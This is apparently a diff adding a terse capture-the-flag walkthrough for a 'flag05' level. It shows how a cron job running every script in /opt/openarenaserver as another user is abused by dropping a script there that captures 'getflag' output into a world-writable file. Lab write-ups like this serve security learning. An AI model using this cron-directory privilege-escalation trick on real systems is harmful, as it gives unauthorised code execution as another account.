@@ -1,0 +1,18 @@
+You have new mail.
+$ cat $MAIL
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+$ cd /opt/openarenaserver/
+$ vim test.sh
+#!/bin/bash
+getflag >> /var/tmp/ok.txt
+$ touch /var/tmp/ok.txt
+$ chmod 777 /var/tmp/ok.txt
+(Wait 2 mins)
+$ cat /var/tmp/ok.txt
